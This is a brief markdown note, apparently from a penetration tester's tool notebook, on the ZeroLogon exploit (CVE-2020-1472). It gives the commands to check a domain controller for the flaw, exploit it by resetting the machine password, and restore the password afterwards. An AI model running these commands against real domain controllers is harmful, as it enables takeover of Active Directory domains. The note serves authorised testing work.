---
tags: [tool, activedirectory, exploit]
tool: "zerologon"
category: "Active Directory"
installed: true
phase: [exploitation]
---

# ZeroLogon (CVE-2020-1472)

## Tool Overview
Purpose: Exploit Netlogon authentication flaw
Location: ~/tools/activedirectory/CVE-2020-1472/

## How to Use It

Check Vulnerability:
zerologon-check -t dc-ip

Exploit and Reset Password:
zerologon-exploit -t dc-ip

Restore Original Password:
restorepassword.py -t dc-ip -u administrator -p new-pass

## Related Tools
nopac, printnightmare
